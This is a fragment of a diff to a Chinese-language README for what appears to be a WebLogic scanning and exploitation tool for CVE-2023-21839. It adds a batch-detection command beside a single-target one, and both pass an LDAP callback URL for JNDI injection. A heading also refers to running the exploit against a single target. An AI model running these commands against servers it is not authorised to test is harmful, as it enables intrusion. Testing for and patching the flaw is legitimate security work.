@@ -61,8 +61,13 @@ cve-2023-21839
 ```
 
 + POC一键检测
-```md
+```go
 WeblogicScanner.exe -u 127.0.0.1 -p 7001 -l ldap://127.0.0.1/#eval
+```
+
++ 批量检测
+```go
+WeblogicScanner.exe -f "C:\Users\Test\Desktop\target.txt" -p 7001 -l ldap://127.0.0.1/#eval
 ```
 
 + EXP单个利用，指定EXP末尾数字即可
